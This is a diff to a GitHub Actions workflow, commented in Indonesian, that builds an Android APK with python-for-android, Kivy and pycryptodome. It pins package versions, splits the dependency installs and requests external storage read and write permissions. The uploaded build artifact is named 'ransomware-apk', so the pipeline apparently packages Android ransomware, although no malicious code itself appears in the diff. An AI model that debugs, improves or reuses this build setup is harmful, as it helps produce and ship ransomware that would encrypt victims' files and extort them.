@@ -9,25 +9,36 @@ on:
 
 jobs:
   build:
-    runs-on: ubuntu-latest
+    runs-on: ubuntu-22.04  # PINDAH KE UBUNTU 22.04 YANG LEBIH STABIL
     steps:
       - name: Checkout code
-        uses: actions/checkout@v4  # Update ke v4
+        uses: actions/checkout@v4
 
       - name: Set up Python
-        uses: actions/setup-python@v5  # Update ke v5
+        uses: actions/setup-python@v5
         with:
           python-version: '3.9'
 
-      - name: Install system dependencies
+      - name: Update package lists
         run: |
-          sudo apt-get update
+          sudo apt-get update --fix-missing
+          sudo apt-get upgrade -y
+
+      - name: Install system dependencies (BATCH 1 - Core)
+        run: |
           sudo apt-get install -y \
             python3-pip \
             openjdk-17-jdk \
             git \
             zip \
             unzip \
+            wget \
+            curl \
+            software-properties-common
+
+      - name: Install system dependencies (BATCH 2 - Build tools)
+        run: |
+          sudo apt-get install -y \
             autoconf \
             libtool \
             pkg-config \
@@ -37,20 +48,41 @@ jobs:
             libtinfo5 \
             cmake \
             libffi-dev \
-            libssl-dev
+            libssl-dev \
+            build-essential
+
+      - name: Install system dependencies (BATCH 3 - Android specific)
+        run: |
+          sudo apt-get install -y \
+            libgl1-mesa-dev \
+            libgles2-mesa-dev \
+            libdrm-dev \
+            libegl1-mesa-dev \
+            libx11-dev \
+            libxext-dev \
+            libxrender-dev \
+            libxcb-xfixes0-dev \
+            libxcb-shape0-dev
 
       - name: Install Python dependencies
         run: |
           pip install --upgrade pip
-          pip install cython virtualenv
-          pip install buildozer python-for-android pycryptodome
+          pip install --upgrade setuptools wheel
+          pip install cython==0.29.36  # Versi stabil
+          pip install virtualenv
+          pip install buildozer==1.5.0
+          pip install python-for-android==2023.9.16
+          pip install pycryptodome==3.19.1
+          pip install requests==2.31.0
+          pip install kivy==2.1.0
 
       - name: Setup Android SDK
         run: |
           mkdir -p $HOME/android-sdk
           cd $HOME/android-sdk
-          wget https://dl.google.com/android/repository/commandlinetools-linux-11076708_latest.zip
-          unzip -o commandlinetools-linux-11076708_latest.zip
+          wget -q https://dl.google.com/android/repository/commandlinetools-linux-11076708_latest.zip
+          unzip -q commandlinetools-linux-11076708_latest.zip
+          rm commandlinetools-linux-11076708_latest.zip
           mkdir -p cmdline-tools/latest
           mv cmdline-tools/* cmdline-tools/latest/ 2>/dev/null || true
           
@@ -60,11 +92,17 @@ jobs:
 
       - name: Accept Android licenses
         run: |
-          yes | $HOME/android-sdk/cmdline-tools/latest/bin/sdkmanager --licenses
+          yes | $HOME/android-sdk/cmdline-tools/latest/bin/sdkmanager --licenses || true
 
       - name: Install SDK components
         run: |
           $HOME/android-sdk/cmdline-tools/latest/bin/sdkmanager "platform-tools" "platforms;android-31" "build-tools;31.0.0"
+
+      - name: Verify installation
+        run: |
+          java -version
+          python --version
+          pip list | grep -E "cython|buildozer|kivy|pycryptodome"
 
       - name: Build APK with python-for-android
         run: |
@@ -79,12 +117,11 @@ jobs:
             --permission READ_EXTERNAL_STORAGE \
             --permission WRITE_EXTERNAL_STORAGE \
             --arch=arm64-v8a \
-            --arch=armeabi-v7a \
             --release
 
       - name: Upload APK artifact
-        uses: actions/upload-artifact@v4  # Update ke v4
+        uses: actions/upload-artifact@v4
         with:
           name: ransomware-apk
           path: ./*.apk
-          if-no-files-found: error  # Tambahin ini biar jelas kalo gagal
+          if-no-files-found: warn
